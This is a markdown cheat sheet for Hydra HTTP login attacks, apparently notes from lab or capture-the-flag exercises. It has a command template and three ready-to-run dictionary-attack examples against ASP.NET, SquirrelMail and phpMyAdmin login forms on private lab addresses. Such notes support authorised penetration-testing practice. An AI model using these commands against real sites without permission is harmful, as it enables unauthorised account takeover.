# Hydra - HTTP

*********************************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
*********************************************************************************

### Webpage Dictionary Attack:
```
hydra -l [USERNAME] -P [WORDLIST-PATH] [TARGET-IP] http-post-form "/[LOGIN-PAGE-PATH]:[REQUEST-PAYLOAD]:[LOGIN-FAIL-TEXT]"
```
Example:
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.86.128 http-post-form "/Account/login.aspx:__VIEWSTATE=J7%2FrKT%2FRbzXElHvOFArr4HX0BUp05PUs%2Bjl4fN5QtFnsigr6tjwFZkWaUW9RaCNkl5wcaaA9I71WXBKsdywllsO45a8kdE%2BO2GeciLswYLZgMhEIYMOLKvVE1g9%2FuxmOjygsPrfW43YX1axgD3V%2FmbHd2lx7jcwje7Qgkp065G2LekTQ&__EVENTVALIDATION=nIJxL4rdGJE3KYMzFDmVH35CAPYLfmVh68KpFWCfpmOAp8i4dLgnYkYLVP3UEDV8IiIqX6kXoIwujnQvd7xTK1Tbiqg5RF0fYL3q6nazJk37P%2BrLs8lq043TvaeMwGi4uqTkx2onf8prQt9NNxgtS4oXE0haNUx6xQId8O8kqlZfYRAG&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
```
Another Example:
```
hydra -l Kyser -P wordlist.txt 10.10.174.36 -V http-form-post ‘/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown User or password incorrect.’
```
And Another Example:
```
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.197.90  http-post-form "/phpmyadmin/index.php:pma_username=root&pma_password=^PASS^&server=1&target=index.php&token=e993beb24a009a9e4f0f7c92c4d63924:#1698 - Access denied for user 'root'@'localhost'"
```
